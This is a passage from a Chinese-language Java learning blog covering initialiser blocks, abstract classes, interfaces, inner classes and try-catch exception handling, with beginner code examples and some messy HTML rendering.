(),实际类型是子类就调用子类构造器并且先执行之前学习的隐藏代码super()即先调用父类的构造器，再调用子类的构造器</li><li>new Person(),实际类型是父类就直接调用父类构造器了</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.oop.dome07;<br><br><span class="hljs-keyword">import</span> com.sun.security.jgss.GSSUtil;<br><span class="hljs-keyword">import</span> com.oop.dome07.Person;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> &#123;<br>   <span class="hljs-comment">//2：赋初始值~</span><br>    &#123;<br>        System.out.println(<span class="hljs-string">&quot;匿名代码块&quot;</span>);<br>    &#125;<br>    <span class="hljs-comment">//1: 只执行一次~</span><br>    <span class="hljs-keyword">static</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;静态代码块&quot;</span>);<br>    &#125;<br>    <span class="hljs-comment">//3：</span><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;构造方法Person&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">Person</span> <span class="hljs-variable">p1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Student</span>();<br>        System.out.println(<span class="hljs-string">&quot;==========&quot;</span>);<br>        Person p2= <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>();<br>    &#125;<br>    <span class="hljs-comment">/*静态代码块</span><br><span class="hljs-comment">    匿名代码块</span><br><span class="hljs-comment">    构造方法Person</span><br><span class="hljs-comment">    构造方法：Student</span><br><span class="hljs-comment">    ==========</span><br><span class="hljs-comment">    匿名代码块</span><br><span class="hljs-comment">    构造方法Person*/</span><br><br><br>&#125;<br><br></code></pre></td></tr></table></figure><ul><li><p>遗留一个问题：静态代码，匿名代码写在了Person 类中</p><p>new一个 引用属性，实际属性都是Student的对象 也会调用静态代码，匿名代码</p></li></ul><hr><p><strong>静态导入包：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.oop.dome07;<br><span class="hljs-comment">//静态导入包</span><br><span class="hljs-keyword">import</span> <span class="hljs-keyword">static</span> java.lang.Math.random;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        System.out.println(random());<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>final 修饰常量，如果类被final修饰是没有办法作为父类继承的</li></ul><p><strong>static 静态方法</strong></p><p>父类是静态方法，子类是不能重写的</p><hr><h3 id="抽象类"><a href="#抽象类" class="headerlink" title="抽象类"></a>抽象类</h3><ul><li>抽象类本质也是类，是由abstract声明的类 （abstract  class）  extends :单继承    （接口可以实现多继承）</li><li>子类继承抽象类后，必须实现抽象方法，除非该子类也必须声明为抽象类。</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.oop.dome08;<br><span class="hljs-comment">//abstract 抽象类</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Action</span> &#123;<br>    <span class="hljs-comment">//abstract 抽象方法，只有方法的名字，在抽象类中没有方法体  方法的实现是在继承他的子类中重写实现</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doSonmething</span><span class="hljs-params">()</span>;<br>&#125;<br><br><br><br><br><br><br><br><br><span class="hljs-keyword">package</span> com.oop.dome08;<br><span class="hljs-comment">//继承了抽象类的子类，都必须要实现(相当于重写) 抽象类 的方法（因为抽象类中没有方法体）  普通方法就不一定必须重写了</span><br><span class="hljs-comment">//除非子类也是抽象类,那就由子子类去实现了</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">A</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Action</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doSonmething</span><span class="hljs-params">()</span> &#123;<br>      <br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><strong>特点：</strong></p><ol><li>抽象类<strong>不能new,无法实例化</strong>，只能靠子类去实现它</li><li>抽象类里面也可以有普通方法，但一旦有了抽象方法就必须是在抽象类里面</li></ol><h3 id="接口"><a href="#接口" class="headerlink" title="接口"></a>接口</h3><ul><li><p>普通类：只有具体实现方法</p><p>抽象类：具体实现方法和定义（抽象方法）都有！</p><p>接口：只有抽象方法的定义！ 约束和实现分离</p><p>接口的本质是契约，声明接口的关键词是：<u>interface</u></p></li><li><p>接口中定义的所有属性，只能是常量，默认修饰符<strong>public static final</strong></p><p>接口中定义的所有方法，默认什么都不写的修饰符<strong>public abstract</strong> </p></li><li><p>没有构造方法</p></li><li><p><em>实现类：</em>一般以impl结尾   一个类实现一个接口通过 implements 关键字，并且一个实现类必须重写接口里面的所有方法</p></li><li><p>实现类实现多个接口，要重写里面的所有抽象方法，如果接口中的方法重名，只需要在实现类中重写一次即可，重写的方法既代表对接口1中方法的重写，又代表对接口2中的方法的重写</p></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//**********接口*************</span><br><span class="hljs-keyword">package</span> com.oop.dome09;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">UserService</span> &#123;<span class="hljs-comment">//接口都需要实现类</span><br>    <span class="hljs-comment">//接口中的所有方法都是默认抽象的 public abstract</span><br>   <span class="hljs-keyword">void</span> <span class="hljs-title function_">add</span><span class="hljs-params">(String name)</span>;<br>   <span class="hljs-keyword">void</span> <span class="hljs-title function_">delete</span><span class="hljs-params">(String name)</span>;<br>   <span class="hljs-keyword">void</span> <span class="hljs-title function_">update</span><span class="hljs-params">(String name)</span>;<br>   <span class="hljs-keyword">void</span> <span class="hljs-title function_">query</span><span class="hljs-params">(String name)</span>;<br>&#125;<br><br><br><br><span class="hljs-comment">//**********实现方法**************</span><br><br><span class="hljs-keyword">package</span> com.oop.dome09;<br><span class="hljs-comment">//implements关键字 可以实现接口   extends 只能是单继承</span><br><br><span class="hljs-comment">//实现了接口的类，就需要重写接口的方法~</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserServiceImpl</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">UserService</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">add</span><span class="hljs-params">(String name)</span> &#123;<br><br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">delete</span><span class="hljs-params">(String name)</span> &#123;<br><br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">update</span><span class="hljs-params">(String name)</span> &#123;<br><br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">query</span><span class="hljs-params">(String name)</span> &#123;<br><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><ul><li>接口里面定义的都是抽象方法，定义常量   静态常量方法</li></ul><p><strong>作用：</strong></p><ol><li>约束</li><li>在接口中定义一些方法（没有方法体），让不同的 实现类 实现，实现接口必须重写方法</li><li>接口不能实例化，没有构造方法。接口中没有方法实现（和抽象类一样），</li><li>implements 可以实现多个接口</li></ol><hr><p><strong>抽象类和接口的共同点</strong></p><ol><li><p>都是为了让方法抽象，再让子类去实现</p></li><li><p>都不能实例化本类对象，只能让子类实例化对象</p></li></ol><hr><p><strong>接口与类之间的关系：</strong></p><ul><li><p>类于类的关系：继承，只能是单继承，不能多继承，（单继承多继承主体是下一级 单继承   多继承）但可以是多层继承</p></li><li><p>类与接口之间的关系：实现关系，实现类  来  实现接口</p></li><li><p>接口与接口之间的关系：继承关系（也是extends关键字），可以单继承，*<u>也可以多继承</u>*</p><p>若实现类实现的是最下面的子接口的话，需要重写这个体系中所有的抽象方法</p></li></ul><hr><h3 id="N种内部类"><a href="#N种内部类" class="headerlink" title="N种内部类"></a>N种内部类</h3><ul><li>java 一个类 中可以有多个class 但只能有一个public class</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.oop.dome10;<br><br><span class="hljs-keyword">import</span> org.w3c.dom.ls.LSOutput;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Outer</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> id=<span class="hljs-number">105</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">out</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;这是外部类的方法&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">outPrivate</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;这是外部类的私有方法&quot;</span>);<br>    &#125;<br><br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span>  <span class="hljs-title class_">Inner</span>&#123;<br><br>       <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">in</span><span class="hljs-params">()</span> &#123;<br>           System.out.println(<span class="hljs-string">&quot;这是内部类的方法&quot;</span>);<br>       &#125;<br><br>       <span class="hljs-comment">//内部类写方法访问外部类的私有属性</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">getId</span><span class="hljs-params">()</span> &#123;<br>            System.out.println(id);<br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">getOut</span><span class="hljs-params">()</span> &#123;<br>           outPrivate();<span class="hljs-comment">//调用外部方法</span><br>        &#125;<br><br>    &#125;<br>&#125;<br><br><br><br><br><span class="hljs-keyword">package</span> com.oop;<br><span class="hljs-keyword">import</span> com.oop.dome10.Outer;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Dome01</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><br>        <span class="hljs-comment">//实例化外部类</span><br>        <span class="hljs-type">Outer</span> <span class="hljs-variable">outer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Outer</span>();<br>        <span class="hljs-comment">//通过外部类对象new内部类来实例化内部类~</span><br>        Outer.<span class="hljs-type">Inner</span> <span class="hljs-variable">inner</span> <span class="hljs-operator">=</span> outer.<span class="hljs-keyword">new</span> <span class="hljs-title class_">Inner</span>();<br>        inner.in();<br><br>        <span class="hljs-comment">//内部类实例化对象调用内部类方法实现访问外部类的私有属性</span><br>        inner.getId();<span class="hljs-comment">//内部类获取外部类私有属性</span><br>        inner.getOut();<span class="hljs-comment">//内部类获取外部类私有方法</span><br>        <br>        <span class="hljs-comment">/*输出： 这是内部类的方法</span><br><span class="hljs-comment">                105</span><br><span class="hljs-comment">                这是外部类的私有方法*/</span><br><br>    &#125;<br>&#125;<br><br><br></code></pre></td></tr></table></figure><p><strong>总结：</strong></p><ul><li><p>实例化内部类对象时，先实例化一个外部的对象，再通过这个外部对象new内部对象</p><ul><li><pre><code class="java">//实例化外部类Outer outer = new Outer();//通过外部类对象new内部类来实例化内部类~Outer.Inner inner = outer.new Inner();<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><br>- ***子类对象访问父类私有属性和方法，内部类对象访问外部类私有属性和方法***，通过在子类或内部类写类似<span class="hljs-keyword">get</span>方法即可获取到<br><br>***<br><br>**静态内部类**<br><br>以上代码的内部类加上<span class="hljs-keyword">static</span> 就是静态内部类了<br><br>- 静态内部类可以直接访问外部类的静态成员，但不能访问外部类的实例成员<br><br>- 静态内部类中   获取外部类的私有属性和方法的代码就会出错：因为先实例化的外部对象，<span class="hljs-keyword">static</span>  静态内部类先加载出来，而外部类的实例成员还没有加载出来<br><br><br><br>**匿名内部类：**<br><br>``` java<br>package com.oop.dome10;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title">Test</span> &#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span>(<span class="hljs-params">String[] args</span>)</span> &#123;<br>        <span class="hljs-comment">/*Apple apple = new Apple();</span><br><span class="hljs-comment">        apple.eat();*/</span><br><br>        <span class="hljs-comment">//没有名字初始化类，不用将实例保存单变量中~</span><br>        <span class="hljs-keyword">new</span> Apple().eat();<br><br><br>        <span class="hljs-comment">//new 接口实例化对象</span><br>        <span class="hljs-comment">//下面这个类其实就是一个实现类，匿名内部类</span><br>        UserService userService = <span class="hljs-keyword">new</span> UserService() &#123;<br>            <span class="hljs-comment">//不重写接口方法的话会报错</span><br>            @Override<br>            <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">hello</span>()</span> &#123;<br>                System.<span class="hljs-keyword">out</span>.println(<span class="hljs-string">&quot;hello&quot;</span>);<br>            &#125;<br><br>        &#125;;<span class="hljs-comment">//注意这里的分号</span><br><br>    &#125;<br>&#125;<br><span class="hljs-comment">//下面的在Test类外面写</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title">Apple</span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">eat</span>()</span>&#123;<br>        System.<span class="hljs-keyword">out</span>.println(<span class="hljs-string">&quot;1&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">//接口</span><br><span class="hljs-keyword">interface</span> <span class="hljs-title">UserService</span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">hello</span>()</span>;<br>&#125;<br></code></pre></td></tr></table></figure></code></pre></li></ul></li></ul><hr><h3 id="异常"><a href="#异常" class="headerlink" title="异常"></a>异常</h3><p>Exception</p><ul><li><p>异常指程序运行中出现的不期而至的各种状况：文件找不到，网络连接失败，非法参数，异常发生在程序运行期间，它影响了程序正常执行流程</p><ul><li><pre><code class="java">int a=10int b=0;int res=a/b;//1.异常是程序当执行到a/b 时，因为 b=0,程序就会出现（抛出）异常，ArithmeticException（算术异常）//2.当抛出异常后，程序就退出，崩溃了//3.这样一个不算致命的错误导致程序崩溃  不好//4.所以需要异常处理机制来解决这个问题System.out.println(&quot;程序继续运行&quot;)；<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs php"><br>- 异常分为两大类：<br><br>  <span class="hljs-built_in">Error</span>：(错误) JVM无法解决的严重错误 eg: 栈溢出   <span class="hljs-built_in">Error</span> 是严重错误，程序会崩溃<br><br>  Excpetion:  分为两大类： 运行时异常（程序运行时异常）和编译时异常（编程时编译器就检查出异常）<br><br>- java把异常当作对象来处理，并定义一个基类java.lang.<span class="hljs-built_in">Throwable</span> 作为所有异常的超类<br><br>***<br><br><br><br><span class="hljs-comment">#### **异常处理机制**</span><br><br>- 进行了异常处理，即使出现了异常，程序仍可继续执行<br><br>  <br><br>*<span class="hljs-keyword">try</span>-<span class="hljs-keyword">catch</span>-<span class="hljs-keyword">finally</span>*<br><br>- 将一段可能有问题的代码选中 ctrl+alt+t 使用<span class="hljs-keyword">try</span>-<span class="hljs-keyword">catch</span>-<span class="hljs-keyword">finally</span> 捕获<br><br>  ```java<br>  <span class="hljs-keyword">try</span>&#123;<br>      <span class="hljs-comment">//可能异常的代码</span><br>  &#125;<span class="hljs-keyword">catch</span>(<span class="hljs-built_in">Exception</span> e)&#123;<br>      <span class="hljs-comment">//当捕获到异常时，系统将异常封装成Exception 对象e  传递给catch</span><br>  &#125;<span class="hljs-keyword">finally</span>&#123;<br>      <span class="hljs-comment">//不管try代码块是否有异常，最终都要执行finally</span><br>      <span class="hljs-comment">//所以一般将关闭资源放在finally中</span><br>  &#125;<br></code></pre></td></tr></table></figure></code></pre></li></ul></li></ul><p><em>throws</em>（投掷）</p><ul><li><p>try-catch-finally 和throws 二选一，程序员如果没有显示处理异常，默认throws</p></li><li><p>将发生的异常抛出，交给调用者（方法来处理），最顶级的处理者就是JVM</p><p>throw 后面的异常类型可以是方法中产生的异常类型，也可以是它的父类</p></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.exception;<br><br><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><span class="hljs-keyword">import</span> java.io.FileNotFoundException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Throws01</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span>  <span class="hljs-title function_">f2</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> FileNotFoundException,NullPointerException ,ArithmeticException &#123;<br>        <span class="hljs-comment">//创建了一个文件流对象</span><br>        <span class="hljs-comment">//1.这里异常是一个编译异常 FileNotFoundException</span><br>        <span class="hljs-comment">//2.可以使用try-catch-finally</span><br>        <span class="hljs-comment">//3. 使用throws ，抛出异常，放调用f2的调用者（方法）处理</span><br>        <span class="hljs-comment">//4.throws 后面的异常类型可以是方法中产生的异常类型，也可以是它的父类</span><br>        <span class="hljs-comment">//5. throws 后面的关键字也可以是抛出多个异常</span><br>        <br>        <span class="hljs-type">FileInputStream</span> <span class="hljs-variable">fis</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-string">&quot;d://aa.txt&quot;</span>);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="/2025/03/20/java-%E5%9F%BA%E7%A1%80/image-20250326094727521-17429950120406.png" alt="image-20250326094727521"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.exception;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">int</span> a=<span class="hljs-number">1</span>;<br>        <span class="hljs-type">int</span> b=<span class="hljs-number">0</span>;<br><br><span class="hljs-comment">//快捷键 ctrl +alt+ t</span><br>        <span class="hljs-keyword">try</span> &#123;<span class="hljs-comment">//try 监控区</span><br>            System.out.println(a/b);<br>        &#125;<span class="hljs-keyword">catch</span> (ArithmeticException e) &#123;<span class="hljs-comment">//catch 捕获异常</span><br>            System.out.println(<span class="hljs-string">&quot;程序异常，变量b不能为0&quot;</span>);<br>        &#125;<span class="hljs-keyword">finally</span> &#123;<span class="hljs-comment">//处理善后工作    ！！！！没有捕获到错误也是执行的</span><br>            System.out.println(<span class="hljs-string">&quot;finally&quot;</span>);<br>        &#125;<br><br>        <span class="hljs-comment">//finally 可以不要   后续学习的 IO流 资源需要关闭！</span><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>捕获多个异常：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.exception;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">int</span> a=<span class="hljs-number">1</span>;<br>        <span class="hljs-type">int</span> b=<span class="hljs-number">0</span>;<br><br><br><br>        <span class="hljs-keyword">try</span> &#123;<span class="hljs-comment">//try 监控区</span><br>            <span class="hljs-keyword">if</span> (b==<span class="hljs-number">0</span>)&#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArithmeticException</span>();<span class="hljs-comment">//主动的抛出异常</span><br>            &#125;<br><br>            System.out.println(a/b);<br>        &#125;<span class="hljs-keyword">catch</span> (Error e) &#123;<span class="hljs-comment">//catch 捕获异常</span><br>            System.out.println(<span class="hljs-string">&quot;Error&quot;</span>);<br>        &#125;<span class="hljs-keyword">catch</span>(Exception e) &#123;<br>            System.out.println(<span class="hljs-string">&quot;Exception&quot;</span>);<br>        &#125;<span class="hljs-keyword">catch</span>(Throwable e) &#123;<br>            System.out.println(<span class="hljs-string">&quot;Exception&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">finally</span> &#123;<br>            System.out.println(<span class="hljs-string">&quot;finally&quot;</span>);<br>        &#125;<br><br>      <br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><a href="https://segmentfault.com/a/1190000045396203">Java异常详解(全文干货) - 个人文章 - SegmentFault 思否</a></p><h4 id="自定义异常"><a href="#自定义异常" class="headerlink" title="自定义异常"></a>自定义异常</h4><p>当程序中出现了某些“错误”，但该错误信息并没有在Throwable子类中描述处理，这个时候可以自己设计异常类，用于描述该错误信息</p><p><strong>步骤：</strong></p><ol><li>定义类：自定义异常类名，继承Exception 